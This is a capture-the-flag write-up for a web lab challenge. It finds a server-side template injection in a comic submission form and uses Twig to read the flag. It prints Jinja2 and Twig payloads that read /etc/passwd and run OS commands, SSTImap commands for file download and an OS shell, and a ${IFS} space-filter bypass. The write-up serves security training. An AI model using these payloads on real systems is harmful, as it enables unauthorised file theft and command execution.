---
title: "Webverselabs Foundry Comics SSTI  "
date: 2026-06-09 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Medium , Challenge , Web_Attacks ]
---


## Scenario : 


Foundry Comics is a three-person riso-print outfit in Gowanus that publishes single-issue runs by emerging cartoonists. In 2022 they picked up a defunct submission portal off another small press that was winding down — quicker than rebuilding from scratch. The portal works, but the migration was never finished: returning creators get routed through whichever bucket the cookie says they belong to, and the two buckets were never fully merged.


## Solution : 


First we start by navigating the application just like a normal user , to try and check different endpoints , functionalities , and just the normal workflow of the web application . 


<img width="1597" height="845" alt="image" src="https://github.com/user-attachments/assets/bed55ec9-485e-4709-9292-4ec803569eee" />


I tried FUZZING for additional endpoints , but didn't get any additional ones , Looking at the different endpoints : 

/Catalog : 

<img width="1469" height="822" alt="image" src="https://github.com/user-attachments/assets/f53ffc39-aee9-4595-9982-a423288814f1" />

This is just a collection of images submitted by the users . 

<img width="1396" height="961" alt="image" src="https://github.com/user-attachments/assets/d1189d57-029c-4958-956b-c5f68c2fafd3" />

If we check each image , we see that we can add it to our cart , but that doesn't lead us anywhere . 

<img width="1470" height="866" alt="image" src="https://github.com/user-attachments/assets/2229492c-5042-4a6b-a854-744462393be7" />

The /about page isn't useful either , just a bunch of pictures with a description for each one . 

But we see that we have the possibility to Submit our own Work in the /submit section .

<img width="1472" height="822" alt="image" src="https://github.com/user-attachments/assets/a8826701-bbff-4548-bf76-fef8c789e746" />

I assume our submition will be sent as a POST request to the server , let's try and do a normal submition just to see how it would look like . 

<img width="1171" height="830" alt="image" src="https://github.com/user-attachments/assets/43dbdcf9-02d5-4dc3-ad69-ed500df2446b" />

Now before it gets added , we see that we have the option to privew our submition : 

<img width="1407" height="613" alt="image" src="https://github.com/user-attachments/assets/10fed81d-253f-4fe2-9fcd-63a441b98bb4" />

If we check Burp's History : 

<img width="1284" height="620" alt="image" src="https://github.com/user-attachments/assets/b6a6b585-1e21-4665-9959-0c4bc80ceb67" />

It is indeed a POST Request , notice how everything we entered got rendered back to us , this is a huge indicator that there might be an SSTI vulnerability here . 

I already have a detailed section on my Web_App methdology for SSTI injections that i will be following : 

```bash
https://elmehdilaassiri.github.io/posts/web-app-pentesting-methodology/#ssti-
```

{% raw %}
```bash
# Detection payload:
${7*7}
{{7*7}}
# Follow this graph to identify the engine:
# https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
```
{% endraw %}
**Exploitation : Jinja2**
{% raw %}
```python
# 1/ Information Disclosure :
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}

# 2/ LFI :
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# 3/ RCE :
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Exploitation : Twig**

```php
# 1/ Information Disclosure :
{{ _self }}

# 2/ LFI :
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# 3/ RCE :
{{ ['id'] | filter('system') }}
```
{% endraw %}


**Automation :**

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

Now first i injected a simple payload 7*7 and based on the response we would know wether or not our code was executed and if we have an SSTI or not , if we get 49 rendered to us this means we got our code executed . 

After that based on the Response we get from the server , we would know which Engine is being used . We will follow this diagram from Payload All the Things . 

<img width="1094" height="475" alt="image" src="https://github.com/user-attachments/assets/abaec2d0-5ba9-44cc-89c9-d6997cfe14bd" />

Now if we go back to our Request and add the payload : 

<img width="1332" height="553" alt="image" src="https://github.com/user-attachments/assets/0a328a93-0a00-4ba1-83b5-b2d7862a17c6" />

We see that our code was acutally executed , and we get the response on the pitch section whih confirms the pitch parameter is vlnerable to an SSTI . 

Now we can move to see which engine is being used , to save time i injected the payloads for Jinja2 first , if it won't work then that will confirm it is Twig . 

<img width="1344" height="620" alt="image" src="https://github.com/user-attachments/assets/fd6131ad-bfca-41f9-9a93-5410552a3837" />

Injecting Jinja payloads doesn't return anything which tells us it isn't the engine that is being used here . 

Let's try a simple Information Disclosure payload for Twig : 

<img width="1391" height="604" alt="image" src="https://github.com/user-attachments/assets/a71955ef-385e-47e7-8de4-ba12d6b82312" />

Perfect  , this confirms that it is Twig , from here we can use the LFI payload to read the flag , it is always located in /flag.txt . 

<img width="1437" height="542" alt="image" src="https://github.com/user-attachments/assets/114ea556-a4ac-4e67-956d-a3499d9d8b9f" />

The LFI payload didn't work for me so i decided to use our RCE to Read the flag . 

<img width="1532" height="645" alt="image" src="https://github.com/user-attachments/assets/d490a1bc-6544-4970-b7bb-a814816851f0" />

Just make sure you don't use space , use ${IFS} instead , or any other way to bypass space filters otherwise it won't work (and ofc URL encode everything) . 

<img width="1527" height="618" alt="image" src="https://github.com/user-attachments/assets/e5c10378-4663-4087-aebd-cc279b1704ae" />

That was all for this challenge , see you in the next one . 




